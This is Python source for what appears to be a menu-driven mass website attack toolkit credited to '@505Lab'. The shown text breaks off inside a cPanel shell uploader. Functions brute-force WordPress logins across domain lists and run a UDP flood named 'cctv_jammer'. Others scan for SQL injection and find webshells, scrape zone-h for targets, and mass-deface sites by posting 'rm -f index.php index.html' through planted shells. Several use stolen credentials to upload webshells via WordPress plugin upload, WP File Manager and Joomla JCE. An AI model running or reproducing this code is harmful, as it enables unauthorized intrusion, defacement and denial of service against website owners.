import requests
import time
import os
import requests
import random
import sys
import socket
import time
import re
import base64
import importlib
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime, timedelta
from urllib.parse import urlparse

def install_and_import(module_name):
    try:
        importlib.import_module(module_name)
    except ImportError:
        print(f"Module '{module_name}' not found")
        install = input(f"Do you want to install the required module '{module_name}'? (y/n): ")
        if install.lower() == 'y':
            os.system(f"pip install {module_name}")
            importlib.import_module(module_name)
        else:
            sys.exit(f"Module '{module_name}' needed for run this tools.")

modules = [
    'requests', 'termios', 'atexit', 'socket', 're', 'pyfiglet', 'base64',
    'cryptography.hazmat.primitives.ciphers', 'cryptography.hazmat.primitives', 
    'cryptography.hazmat.backends', 'bs4', 'concurrent.futures', 'datetime'
]

for module in modules:
    install_and_import(module)


def clear_console():
    os.system('clear')

def animate_startup():
    print("Program is running...")
    for i in range(5):
        print(f"{'ðŸš€ï¸' * (i + 1)}")
        time.sleep(1)
    clear_console()

def banner():
    print("\033[92mâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—\033[90m")
    print("\033[92mâ–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ•”â•â–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â•â•â•\033[90m")
    print("\033[92mâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—\033[90m")
    print("\033[92mâ•šâ•â•â•â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘â•šâ•â•â•â•â–ˆâ–ˆâ•‘\033[90m")
    print("\033[92mâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘\033[90m")
    print("\033[92mâ•šâ•â•â•â•â•â•â• â•šâ•â•â•â•â•â• â•šâ•â•â•â•â•â•â•\033[90m")
                         
def brute_force_wordpress():
    results = []
    animate_startup()
    os.system('clear')
    banner()
    print("\033[92mDeveloped by\033[0m @505Lab | t.me/Lab505")
    print(" ")
    print(" ")
    print("\033[91mEnter domain file: \033[0m")
    domain_file = input("->> Input File : ")
    print("\033[91mEnter username wordlist file: \033[0m")
    admin_file = input("->> Input File : ")
    print("\033[91mEnter password wordlist file: \033[0m")
    password_file = input("->> Input File : ")

    with open(domain_file, 'r') as f:
        domains = f.read().splitlines()

    with open(admin_file, 'r') as f:
        admins = f.read().splitlines()

    with open(password_file, 'r') as f:
        passwords = f.read().splitlines()

    def check_domain(domain):
        url = domain + "/wp-login.php"
        if requests.head(url).status_code != 200:
            url = domain + "/admin/wp-login.php"
        print(f"\033[{random.randint(30,37)}m{domain} is being attempted for brute force, the process may take a long time according to the wordlist\033[0m")
        print("ðŸš€ï¸ Bruteforce in progress... ðŸš€ï¸")
        for admin in admins:
            for password in passwords:
                data = {"log": admin, "pwd": password}
                response = requests.post(url, data=data)
                if "Dashboard" in response.text:
                    return f"{domain}|{admin}|{password}"
        return None

    with ThreadPoolExecutor() as executor:
        futures = [executor.submit(check_domain, domain) for domain in domains]
        for future in futures:
            result = future.result()
            if result:
                results.append(result)
                print(f"\033[{random.randint(30,37)}mSite {result.split('|')[0]} successfully breached with username {result.split('|')[1]}.\033[0m")

    if len(results) > 0:
        with open("wordpress_result.txt", "w") as f:
            for result in results:
                f.write(result + "\n")
        print(f"\033[{random.randint(30,37)}mBrute force results have been saved in wordpress_result.txt\033[0m")
    else:
        print(f"\033[{random.randint(30,37)}mNo sites were successfully breached with the given passwords.\033[0m")
    print("ðŸš€ï¸ Bruteforce completed! ðŸš€ï¸")
    print("Program has been completed.")
    print("\033[91mPress CTRL+B to return to the main menu\033[0m")

def single_brute_force_wordpress():
    results = []
    os.system('clear')
    animate_startup()
    os.system('clear')
    banner()
    print("\033[92mDeveloped by\033[0m @505Lab | t.me/Lab505")
    print(" ")
    print(" ")
    print("\033[91mEnter domain: \033[0m")
    domain = input("->> Input Domain : ")
    print("\033[91mEnter username: \033[0m")
    admin = input("->> Input Username : ")
    print("\033[91mEnter password wordlist file: \033[0m")
    password_file = input("->> Input File : ")

    try:
        with open(password_file, 'r', encoding='utf-8', errors='ignore') as f:
            passwords = f.read().splitlines()
    except Exception as e:
        print(f"An error occurred: {e}")
        return

    def check_domain(domain):
        url = domain + "/wp-login.php"
        if requests.head(url).status_code != 200:
            url = domain + "/admin/wp-login.php"
        print(f"\033[{random.randint(30,37)}m{domain} is being attempted for brute force, the process may take a long time according to the wordlist\033[0m")
        print("ðŸš€ï¸ Bruteforce in progress... ðŸš€ï¸")
        for password in passwords:
            data = {"log": admin, "pwd": password}
            response = requests.post(url, data=data)
            if "Dashboard" in response.text:
                return f"{domain}|{admin}|{password}"
        return None

    result = check_domain(domain)
    if result:
        results.append(result)
        print(f"\033[{random.randint(30,37)}mSite {result.split('|')[0]} successfully breached with username {result.split('|')[1]}.\033[0m")

    if len(results) > 0:
        with open("single_wordpress_result.txt", "w") as f:
            for result in results:
                f.write(result + "\n")
        print(f"\033[{random.randint(30,37)}mBrute force results have been saved in single_wordpress_result.txt\033[0m")
    else:
        print(f"\033[{random.randint(30,37)}mNo sites were successfully breached with the given passwords.\033[0m")
    print("ðŸš€ï¸ Bruteforce completed! ðŸš€ï¸")
    print("Program has been completed.")

def shell_finder():
    import concurrent.futures

    os.system('clear')
    animate_startup()
    os.system('clear')
    banner()
    print("\033[92mDeveloped by\033[0m @505Lab | t.me/Lab505")
    print("Note : Websites should start with 'http://' and should not end with '/'")
    print(" ")
    print(" ")
    print("\033[91m[*] INFO: Please enter the name of the website list file...\033[0m")
    website_file = input()
    print("\033[92m[*] INFO: Loading websites...\033[0m")
    websites = [website.rstrip('\n') for website in open(website_file)]

    print("\033[92m[*] INFO: Loading endpoints...\033[0m")
    endpoints = [endpoint.rstrip('\n') for endpoint in open('shell-path.txt')]

    print("\033[92m[*] INFO: Searching...\033[0m")

    def check_shell(website, endpoint):
        url = website + "/" + endpoint
        res = requests.get(url)
        if res.status_code == 200 and "backdoor" in res.text or "shell" in res.text or "root" in res.text:
            print(f"\033[92m[+] SUCCESS: Shell found at: {url}\033[0m")
            return url
        return None

    successful_sites = []

    with concurrent.futures.ThreadPoolExecutor() as executor:
        for website in websites:
            print(f"\033[94m[*] INFO: Target: {website}\033[0m")
            futures = [executor.submit(check_shell, website, endpoint) for endpoint in endpoints]
            for future in concurrent.futures.as_completed(futures):
                result = future.result()
                if result:
                    successful_sites.append(result)
                    break

    if successful_sites:
        with open("shells.txt", "w") as f:
            for site in successful_sites:
                f.write(site + "\n")
        print(f"\033[92m[+] SUCCESS: Shells have been saved in shells.txt\033[0m")
    else:
        print(f"\033[91m[-] No shells found.\033[0m")

def cctv_jammer():
    os.system('clear')
    animate_startup()
    os.system('clear')
    banner()
    print("\033[92mDeveloped by\033[0m @505Lab | t.me/Lab505")
    print(" ")
    print(" ")
    target_ip = input("\033[91mInput Target IP : \033[0m")
    port = int(input("\033[91mInput Target Port : \033[0m"))  # Convert port input to integer
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    packet = bytes(65507)  # Maximum UDP packet size
    while True:
        sock.sendto(packet, (target_ip, port))
        print(f"\033[92mSending Maximum Strength Attack to {target_ip}:{port}\033[0m")
        time.sleep(0.01)  # Reduce delay between packet sends for stronger attack

def sqli_vulnscan():
    os.system('clear')
    animate_startup()
    os.system('clear')
    banner()
    print("\033[92mDeveloped by\033[0m @505Lab | t.me/Lab505")
    print(" ")
    print(" ")
    print("\033[91m[*] INFO: Please enter the name of the website list file...\033[0m")
    website_file = input("->> Input File : ")
    print("\033[94m[*] INFO: Loading websites...\033[0m")
    websites = [website.rstrip('\n') for website in open(website_file)]

    DBMS_ERRORS = {
        "MySQL": (r"SQL syntax.*MySQL", r"Warning.*mysql_.*", r"valid MySQL result", r"MySqlClient\."),
        "PostgreSQL": (r"PostgreSQL.*ERROR", r"Warning.*\Wpg_.*", r"valid PostgreSQL result", r"Npgsql\."),
        "Microsoft SQL Server": (r"Driver.* SQL[\-\_\ ]*Server", r"OLE DB.* SQL Server", r"(\W|\A)SQL Server.*Driver", r"Warning.*mssql_.*", r"(\W|\A)SQL Server.*[0-9a-fA-F]{8}", r"(?s)Exception.*\WSystem\.Data\.SqlClient\.", r"(?s)Exception.*\WRoadhouse\.Cms\."),
        "Microsoft Access": (r"Microsoft Access Driver", r"JET Database Engine", r"Access Database Engine"),
        "Oracle": (r"\bORA-[0-9][0-9][0-9][0-9]", r"Oracle error", r"Oracle.*Driver", r"Warning.*\Woci_.*", r"Warning.*\Wora_.*"),
        "IBM DB2": (r"CLI Driver.*DB2", r"DB2 SQL error", r"\bdb2_\w+\("),
        "SQLite": (r"SQLite/JDBCDriver", r"SQLite.Exception", r"System.Data.SQLite.SQLiteException", r"Warning.*sqlite_.*", r"Warning.*SQLite3::", r"\[SQLITE_ERROR\]"),
        "Sybase": (r"(?i)Warning.*sybase.*", r"Sybase message", r"Sybase.*Server message.*"),
    }

    print("\033[94m[*] INFO: Scanning for SQL Injection vulnerabilities...\033[0m")
    vuln_websites = []
    for website in websites:
        try:
            print("\033[94m[*] INFO: Target: " + website + "\033[0m")
            vuln_url = website + "'"
            res = requests.get(vuln_url, timeout=7)  # Add 7-second timeout
            vulnerable = False
            with ThreadPoolExecutor(max_workers=50) as executor:
                futures = []
                for dbms, errors in DBMS_ERRORS.items():
                    for error in errors:
                        futures.append(executor.submit(re.search, error, res.text))
                for future in futures:
                    if future.result():
                        dbms = list(DBMS_ERRORS.keys())[futures.index(future) // len(DBMS_ERRORS[list(DBMS_ERRORS.keys())[0]])]
                        print(" ")
                        print("--------------------------------------------------")
                        print(f"\033[92m[+] VULNERABLE: {website} is vulnerable to SQL Injection. Detected DBMS: {dbms}\033[0m")
                        print("--------------------------------------------------")
                        print(" ")
                        vuln_websites.append(f"{website} - Detected DBMS: {dbms}")
                        vulnerable = True
                        break
                if not vulnerable:
                    print(f"\033[91m[-] NOT VULNERABLE: {website} is not vulnerable to SQL Injection.\033[0m")
        except requests.exceptions.Timeout:
            print(f"\033[91m[-] TIMEOUT: {website} did not respond within 7 seconds. Moving to the next website...\033[0m")
        except Exception as e:
            print(f"\033[91m[-] ERROR: {e}\033[0m")

    # Save results to file
    if not os.path.exists("vuln_websites.txt"):
        with open("vuln_websites.txt", "w") as f:
            pass  # Create file if it doesn't exist

    with open("vuln_websites.txt", "w") as f:
        for vuln_website in vuln_websites:
            f.write(vuln_website + "\n")
    print("\033[94m[*] INFO: Scan results saved in vuln_websites.txt\033[0m")

def zone_xsec_grabber():
    os.system('clear')
    animate_startup()
    os.system('clear')
    banner()
    print(" ")
    print(" ")
    zhe = input("Enter ZHE cookie value: ")
    phpsessid = input("Enter PHPSESSID cookie value: ")
    output_notiferz_file = input("Enter the output file name for notiferz: ")
    output_sites_file = input("Enter the output file name for sites: ")
    print("Procces may take a long time, make a coffe")
    cookie = {
        "ZHE": zhe,
        "PHPSESSID": phpsessid
    }
    notiferz = []
    print('Grab The Notifers Page 1-10')
    for n in range(10):
        usr = requests.get('https://zone-h.org/archive/published=0/page=' + str(n + 1), cookies=cookie).content
        if 'If you often get this captcha when gathering data' in usr.decode('utf-8'):
            input('Please Go to https://zone-h.org/archive/published=0 And Verify the captcha then press enter ....')
            usr = requests.get('https://zone-h.org/archive/published=0/page=' + str(n + 1), cookies=cookie).content
        soup = BeautifulSoup(usr, 'html.parser')
        amir = soup.findAll('a')
        for i in range(len(amir)):
            if '/archive/notifier=' in str(amir[i]):
                vv = str(amir[i]).replace('<a href="/archive/notifier=', '')
                notif = ''
                for j in range(len(vv) - 1):
                    if not (vv[j] + vv[j + 1] == '">'):
                        notif = notif + vv[j]
                    else:
                        break
                if notif not in notiferz:
                    notiferz.append(notif)
                    open(output_notiferz_file, 'a+').write(notif + '\n')
    print('Notifers Grabbed : ' + str(len(notiferz)))
    sitez = []
    for i in range(len(notiferz)):
        print('Grabbing Sites ' + str(notiferz[i]))
        for j in range(50):
            verif = requests.get('http://www.zone-h.org/archive/notifier=' + str(notiferz[i]) + '/page=' + str(j + 1), cookies=cookie).content
            if 'If you often get this captcha when gathering data' in verif.decode('utf-8'):
                input('Please Go to https://zone-h.org/archive/published=0 And Verify the captcha then press enter ....')
                verif = requests.get('http://www.zone-h.org/archive/notifier=' + str(notiferz[i]) + '/page=' + str(j + 1), cookies=cookie).content
            soup = BeautifulSoup(verif, 'html.parser')
            amir = soup.findAll("td", {"class": "defacepages"})
            if '<strong>0</strong>' in str(amir[0]):
                break
            else:
                verif = verif.decode('utf-8')
                king = re.findall('<td>(.*)\n							</td>', verif)
                for oo in king:
                    newurl = 'http://' + str(oo.split('/')[0])
                    if str(newurl) not in sitez:
                        sitez.append(newurl)
                        open(output_sites_file, 'a+').write(newurl + '\n')
                        print(newurl)

def mass_deface():
    os.system('clear')
    animate_startup()
    os.system('clear')
    banner()
    print("\033[92mDeveloped by\033[0m @505Lab | t.me/Lab505")
    print("Note : make sure the shell is uploaded in they public_html path")
    print(" ")
    print(" ")
    print("\033[91mEnter domain file (including webshell path): \033[0m")
    domain_file = input("->> Input File : ")
    print("\033[91mEnter deface script file: \033[0m")
    deface_script_file = input("->> Input File : ")
    print("\033[91mEnter output file name: \033[0m")
    output_file = input("->> Output File : ")
    print("Procces may take a long time, make a coffe")

    try:
        with open(domain_file, 'r') as f:
            domains = f.read().splitlines()
        with open(deface_script_file, 'r') as f:
            deface_script = f.read()
    except Exception as e:
        print(f"An error occurred: {e}")
        return

    def deface_site(domain, deface_script):
        url = domain
        delete_data = {
            "cmd": "rm -f index.php index.html"
        }
        upload_data = {
            "file": ("index.php", deface_script, "text/html")
        }
        try:
            delete_response = requests.post(url, data=delete_data)
            upload_response = requests.post(url, files=upload_data)
            if upload_response.status_code == 200:
                return f"{domain}/index.php"
        except Exception as e:
            print(f"An error occurred with {domain}: {e}")
        return None

    results = []
    for domain in domains:
        result = deface_site(domain, deface_script)
        if result:
            results.append(result)
            print(f"\033[{random.randint(30,37)}mSite {result} successfully defaced.\033[0m")

    if len(results) > 0:
        with open(output_file, "w") as f:
            for result in results:
                f.write(result + "\n")
        print(f"\033[{random.randint(30,37)}mDeface results have been saved in {output_file}\033[0m")
    else:
        print(f"\033[{random.randint(30,37)}mNo sites were successfully defaced.\033[0m")
    print("ðŸš€ï¸ Deface completed! ðŸš€ï¸")

def reverse_ip_lookup():
    os.system('clear')
    animate_startup()
    os.system('clear')
    banner()
    print(" ")
    print(" ")
    print("\033[91mEnter IP address: \033[0m")
    ip_address = input("->> Input IP : ")
    print("\033[91mEnter output file name: \033[0m")
    output_file = input("->> Output File : ")

    print("Procces may take a long time, make a coffe")

    try:
        response = requests.get(f"https://api.hackertarget.com/reverseiplookup/?q={ip_address}")
        if response.status_code == 200:
            results = response.text.splitlines()
            if results:
                print(f"\033[{random.randint(30,37)}mReverse IP lookup results for {ip_address}:\033[0m")
                for result in results:
                    print(result)
                with open(output_file, "w") as f:
                    for result in results:
                        f.write(result + "\n")
                print(f"\033[{random.randint(30,37)}mReverse IP lookup results have been saved in {output_file}\033[0m")
            else:
                print(f"\033[{random.randint(30,37)}mNo results found for {ip_address}.\033[0m")
        else:
            print(f"\033[{random.randint(30,37)}mFailed to retrieve data. Status code: {response.status_code}\033[0m")
    except Exception as e:
        print(f"An error occurred: {e}")

def reverse_domain_lookup():
    os.system('clear')
    animate_startup()
    os.system('clear')
    banner()
    print(" ")
    print(" ")
    print("\033[91mEnter domain: \033[0m")
    domain = input("->> Input Domain : ")
    print("\033[91mEnter output file name: \033[0m")
    output_file = input("->> Output File : ")

    print("Procces may take a long time, make a coffe")

    try:
        response = requests.get(f"https://api.hackertarget.com/hostsearch/?q={domain}")
        if response.status_code == 200:
            results = response.text.splitlines()
            if results:
                print(f"\033[{random.randint(30,37)}mReverse domain lookup results for {domain}:\033[0m")
                for result in results:
                    print(result)
                with open(output_file, "w") as f:
                    for result in results:
                        f.write(result + "\n")
                print(f"\033[{random.randint(30,37)}mReverse domain lookup results have been saved in {output_file}\033[0m")
            else:
                print(f"\033[{random.randint(30,37)}mNo results found for {domain}.\033[0m")
        else:
            print(f"\033[{random.randint(30,37)}mFailed to retrieve data. Status code: {response.status_code}\033[0m")
    except Exception as e:
        print(f"An error occurred: {e}")

def login_to_wordpress(url, username, password):
    login_data = {
        'log': username,
        'pwd': password
    }
    response = requests.post(url, data=login_data)
    return response

def check_wordpress_logins(file_path, output_file):
    with open(file_path, 'r') as file:
        for line in file:
            url, credentials = line.strip().split('#')
            username, password = credentials.split('@')
            try:
                response = login_to_wordpress(url, username, password)
                if 'Dashboard' in response.text:
                    print(f'[\033[92m+\033[0m] {url}#{username}@{password}')
                    with open(output_file, 'a') as result_file:
                        result_file.write(f'{url}#{username}@{password}\n')
                else:
                    print(f'[\033[91mX\033[0m] {url}#{username}@{password}')
            except Exception as e:
                print(f"An error occurred with {url}: {e}")
                continue

def wp_login_checker():
    os.system('clear')
    animate_startup()
    os.system('clear')
    banner()
    print(" ")
    print(" ")
    print("Note : format use [url#user/login@password]")
    print("\033[91mEnter file path for WP login check: \033[0m")
    file_path = input("->> Input File : ")
    print("\033[91mEnter output file name: \033[0m")
    output_file = input("->> Output File : ")
    try:
        check_wordpress_logins(file_path, output_file)
    except Exception as e:
        print(f"An error occurred: {e}")
def check_proxy(proxy):
    try:
        response = requests.get("http://www.google.com", proxies={"http": proxy, "https": proxy}, timeout=5)
        if response.status_code == 200:
            return True
    except:
        return False

def mass_proxy_checker():
    os.system('clear')
    animate_startup()
    os.system('clear')
    banner()
    print(" ")
    print(" ")
    print("\033[91mEnter proxy list file: \033[0m")
    proxy_file = input("->> Input File : ")
    print("\033[91mEnter output file for valid proxies: \033[0m")
    output_file = input("->> Output File : ")

    try:
        with open(proxy_file, 'r') as f:
            proxies = f.read().splitlines()
    except Exception as e:
        print(f"An error occurred: {e}")
        return

    valid_proxies = []
    for proxy in proxies:
        if check_proxy(proxy):
            valid_proxies.append(proxy)
            print(f"\033[{random.randint(30,37)}mValid proxy: {proxy}\033[0m")
            with open(output_file, 'a') as f:
                f.write(proxy + "\n")
        else:
            print(f"\033[{random.randint(30,37)}mInvalid proxy: {proxy}\033[0m")

    if valid_proxies:
        print(f"\033[{random.randint(30,37)}mValid proxies have been saved in {output_file}\033[0m")
    else:
        print(f"\033[{random.randint(30,37)}mNo valid proxies found.\033[0m")

def check_cve_and_cms(url):
    try:
        response = requests.get(url)
        response.raise_for_status()
        soup = BeautifulSoup(response.text, 'html.parser')
        cve_list = []
        cms_info = None

        for link in soup.find_all('a'):
            href = link.get('href')
            if href and 'CVE-' in href:
                cve_list.append(href)

        # Mencari informasi CMS dan versinya
        meta_generator = soup.find('meta', attrs={'name': 'generator'})
        if meta_generator:
            cms_info = meta_generator.get('content')

        return cve_list, cms_info
    except requests.exceptions.RequestException as e:
        print(f"Error accessing {url}: {e}")
        return [], None

def get_output_filename(base_name="ccms.txt"):
    counter = 1
    filename = base_name
    while os.path.exists(filename):
        filename = f"{base_name.split('.')[0]}_{counter}.txt"
        counter += 1
    return filename

def process_url(url, output_folder):
    url = url.strip()
    cve_list, cms_info = check_cve_and_cms(url)
    if cms_info:
        cms_key = cms_info.split()[0].lower()
        cms_filename = f"{output_folder}/cms_{cms_key}.txt"
    else:
        cms_filename = f"{output_folder}/cms_unknown.txt"

    with open(cms_filename, 'a') as cms_file:
        cms_file.write(f"{url}\n")

def cms_checker():
    os.system('clear')
    animate_startup()
    os.system('clear')
    banner()
    print(" ")
    print(" ")
    print("\033[91mEnter file path for CMS check: \033[0m")
    input_file = input("->> Input File : ")
    print("\033[91mEnter output folder: \033[0m")
    output_folder = input("->> Output Folder : ")

    if not os.path.exists(output_folder):
        os.makedirs(output_folder)

    try:
        with open(input_file, 'r') as file:
            urls = file.readlines()
    except Exception as e:
        print(f"An error occurred: {e}")
        return

    with ThreadPoolExecutor(max_workers=50) as executor:
        futures = [executor.submit(process_url, url, output_folder) for url in urls]
        for future in futures:
            future.result()

def proxy_scrape_and_validate():
    os.system('clear')
    animate_startup()
    banner()
    print(" ")
    print(" ")
    os.system('clear')
    print("\033[91mEnter output file name for valid proxies: \033[0m")
    output_file = input("->> Output File : ")

    def get_proxies():
        urls = [
            'https://www.sslproxies.org/',
            'https://free-proxy-list.net/',
            'https://www.us-proxy.org/',
            'https://www.socks-proxy.net/',
            'https://www.proxy-list.download/HTTP',
            'https://www.proxy-list.download/HTTPS',
            'https://www.proxy-list.download/SOCKS4',
            'https://www.proxy-list.download/SOCKS5',
            'https://www.proxynova.com/proxy-server-list/',
            'https://www.proxy-listen.de/Proxy/Proxyliste.html'
        ]
        proxies = []
        for url in urls:
            response = requests.get(url)
            proxies += re.findall(r'\d+\.\d+\.\d+\.\d+:\d+', response.text)
        return proxies

    def validate_proxy(proxy):
        try:
            response = requests.get('http://www.google.com', proxies={'http': proxy, 'https': proxy}, timeout=5)
            return response.status_code == 200
        except:
            return False

    def save_valid_proxy(proxy):
        with open(output_file, 'a') as file:
            file.write(proxy + '\n')
            print(f"Valid proxy: {proxy}")

    proxies = get_proxies()
    for proxy in proxies:
        if validate_proxy(proxy):
            save_valid_proxy(proxy)
            

def remove_duplicates():
    os.system('clear')
    animate_startup()
    os.system('clear')
    banner()
    print("\033[91mEnter input file name: \033[0m")
    input_file = input("->> Input File : ")
    print("\033[91mEnter output file name: \033[0m")
    output_file = input("->> Output File : ")

    print("This process might take a while...")

    try:
        with open(input_file, 'r', encoding='utf-8', errors='ignore') as f:
            lines = f.read().splitlines()
        
        unique_lines = list(set(lines))

        with open(output_file, 'w', encoding='utf-8', errors='ignore') as f:
            for line in unique_lines:
                f.write(line + '\n')

        print(f"\033[{random.randint(30,37)}mDuplicate removal complete. Results saved in {output_file}\033[0m")
    except Exception as e:
        print(f"An error occurred: {e}")

class DomainGrabber:

    banner()

    def daterange(start_date, end_date):
        for n in range(int((end_date - start_date).days) + 1):
            yield start_date + timedelta(n)

    def checkTLD(domain):
        req = requests.get("https://zoxh.com/tld").text
        all_tld = re.findall('/tld/(.*?)"', req)
        if domain in all_tld:
            return True
        else:
            return False

    def TLD(domain_tld, start_page=1, end_page=None):
        if end_page is None:
            req = requests.get(f"https://zoxh.com/tld/{domain_tld}").text
            end_page = int(re.findall('href="/tld/{}/(.*?)"'.format(domain_tld), req)[-2])

        with ThreadPoolExecutor(max_workers=50) as executor:
            for i in range(start_page, end_page+1):
                executor.submit(DomainGrabber.grabPage, domain_tld, i)

    def grabPage(domain_tld, page):
        try:
            req_grab = requests.get(f"https://zoxh.com/tld/{domain_tld}/{page}").text
            all_domain = "\n".join(re.findall('/i/(.*?)"', req_grab)).strip("\r\n")
            total_domain = len(all_domain.split("\n"))
            with open(f"tld_{domain_tld}.txt", "a") as f:
                f.write(all_domain + "\n")
            print(f"\t[>] Grabbed {total_domain} Domain | Page {page}")
        except:
            pass

def tld_domain_dork():
    os.system('clear')
    animate_startup()
    os.system('clear')
    banner()
    print("\033[92mDeveloped by\033[0m @505Lab")
    print(" ")
    print(" ")
    input_tld = input("\033[91mENTER TLD (ex: com) : \033[0m")

    if DomainGrabber.checkTLD(input_tld):
        DomainGrabber.TLD(input_tld)
    else:
        exit("\033[91m[!] Unknown Domain TLD [!]\033[0m")

def wordpress_auto_upload_shell():
    os.system('clear')
    animate_startup()
    os.system('clear')
    banner()
    print("\033[92mDeveloped by\033[0m @505Lab | t.me/Lab505")
    print("Note: File format should be url/wp-login.php#(username)@(password)")
    print(" ")
    print(" ")
    print("The wordpress login should have WP File Manager")
    print("\033[91m[*] INFO: Please enter the name of the file containing the URLs...\033[0m")
    file_name = input("->> Input File : ")
    print("\033[91m[*] INFO: Please enter the path to the shell file...\033[0m")
    shell_file = input("->> Input Shell File : ")
    print("\033[91m[*] INFO: Please enter the name of the output file...\033[0m")
    output_file = input("->> Input Output File : ")

    try:
        with open(file_name, 'r', encoding='utf-8', errors='ignore') as f:
            urls = f.read().splitlines()
    except Exception as e:
        print(f"An error occurred: {e}")
        return

    for line in urls:
        try:
            url, credentials = line.strip().split('#')
            username, password = credentials.split('@')
            username = username.strip()
            password = password.strip()
            session = requests.Session()
            login_data = {
                'log': username,
                'pwd': password,
                'wp-submit': 'Log In',
                'redirect_to': f'{url.replace("/wp-login.php", "")}/wp-admin/',
                'testcookie': '1'
            }
            response = session.post(url, data=login_data)
            if response.status_code == 200 and 'wp-admin' in response.url:
                print(f"\033[92m[+] SUCCESS: Logged in to: {url}\033[0m")
                response = session.get(f'{url.replace("/wp-login.php", "")}/wp-admin/plugin-install.php?tab=upload')
                if 'upload-plugin' in response.text:
                    with open(shell_file, 'rb') as f:
                        files = {'pluginzip': f}
                        response = session.post(f'{url.replace("/wp-login.php", "")}/wp-admin/update.php?action=upload-plugin', files=files)
                        if 'Plugin installed successfully' in response.text:
                            shell_url = f"{url.replace('/wp-login.php', '')}/{shell_file.split('/')[-1]}"
                            print(f"\033[92m[+] SUCCESS: Shell uploaded to: {shell_url}\033[0m")
                            with open(output_file, "a") as success_file:
                                success_file.write(f"{shell_url}\n")
                        else:
                            print(f"\033[91m[-] FAILED: Shell upload failed for: {url}\033[0m")
                else:
                    print(f"\033[91m[-] {url} Wordpress not have file manager, attempting to install it\033[0m")
                    plugin_data = {
                        'plugin': 'wp-file-manager',
                        'action': 'install-plugin'
                    }
                    response = session.post(f'{url.replace("/wp-login.php", "")}/wp-admin/update.php?action=install-plugin', data=plugin_data)
                    if 'Plugin installed successfully' in response.text:
                        print(f"\033[92m[+] SUCCESS: WP File Manager installed on: {url}\033[0m")
                        with open(shell_file, 'rb') as f:
                            files = {'pluginzip': f}
                            response = session.post(f'{url.replace("/wp-login.php", "")}/wp-admin/update.php?action=upload-plugin', files=files)
                            if 'Plugin installed successfully' in response.text:
                                shell_url = f"{url.replace('/wp-login.php', '')}/{shell_file.split('/')[-1]}"
                                print(f"\033[92m[+] SUCCESS: Shell uploaded to: {shell_url}\033[0m")
                                with open(output_file, "a") as success_file:
                                    success_file.write(f"{shell_url}\n")
                            else:
                                print(f"\033[91m[-] FAILED: Shell upload failed for: {url}\033[0m")
                    else:
                        print(f"\033[91m[-] FAILED: WP File Manager installation failed for: {url}\033[0m")
            else:
                print(f"\033[91m[-] {url} Login failed, please check your credentials\033[0m")
        except Exception as e:
            print(f"An error occurred with {line}: {e}")
            continue

def joomla_auto_upload_shell():
    os.system('clear')
    animate_startup()
    os.system('clear')
    banner()
    print("\033[92mDeveloped by\033[0m @505Lab | t.me/Lab505")
    print("Note: File format should be url#(username)@(password)")
    print(" ")
    print(" ")
    print("The Joomla login should have JCE File Manager")
    print("\033[91m[*] INFO: Please enter the name of the file containing the URLs...\033[0m")
    file_name = input("->> Input File : ")
    print("\033[91m[*] INFO: Please enter the path to the shell file...\033[0m")
    shell_file = input("->> Input Shell File : ")
    print("\033[91m[*] INFO: Please enter the name of the output file...\033[0m")
    output_file = input("->> Input Output File : ")

    try:
        with open(file_name, 'r', encoding='utf-8', errors='ignore') as f:
            urls = f.read().splitlines()
    except Exception as e:
        print(f"An error occurred: {e}")
        return

    for line in urls:
        try:
            url, credentials = line.strip().split('#')
            username, password = credentials.split('@')
            username = username.strip()
            password = password.strip()
            session = requests.Session()
            login_data = {
                'username': username,
                'passwd': password,
                'option': 'com_login',
                'task': 'login',
                'return': 'aW5kZXgucGhw'
            }
            response = session.post(f'{url}/administrator/index.php', data=login_data)
            if 'task=profile.edit' in response.text:
                response = session.get(f'{url}/administrator/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form')
                if 'Upload' in response.text:
                    with open(shell_file, 'rb') as f:
                        files = {'upload': f}
                        response = session.post(f'{url}/administrator/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=upload', files=files)
                        if 'File uploaded' in response.text:
                            shell_url = f"{url}/{shell_file.split('/')[-1]}"
                            print(f"\033[92m[+] SUCCESS: Shell uploaded to: {shell_url}\033[0m")
                            with open(output_file, "a") as success_file:
                                success_file.write(f"{shell_url}\n")
                        else:
                            print(f"\033[91m[-] FAILED: Shell upload failed for: {url}\033[0m")
                else:
                    print(f"\033[91m[-] {url} Joomla not have JCE File Manager\033[0m")
            else:
                print(f"\033[91m[-] {url} This website cannot be reached out\033[0m")
        except Exception as e:
            print(f"An error occurred with {line}: {e}")
            continue

def cpanel_auto_upload_shell():
    os.system('clear')
    animate_startup()
    os.system('clear')
    banner()
    print("\033[92mDeveloped by\033[0m @505Lab | t.me/Lab505")
    print("Note: File format should be url#(username)@(password)")
    print(" ")
    print(" ")
    print("\033[91m[*] INFO: Please enter the name of the file containing the URLs...\033[0m")
    file_name = input("->> Input File : ")
    print("\033[91m[*] INFO: Please enter the path to the shell file...\033[0m")
    shell_file = input("->> Input Shell File : ")
    print("\033[91m[*] INFO: Please enter the name of the output file...\033[0m")
    output_file = input("->> Input Output File : ")

    try:
        with open(file_name, 'r', encoding='utf-8', errors='ignore') as f:
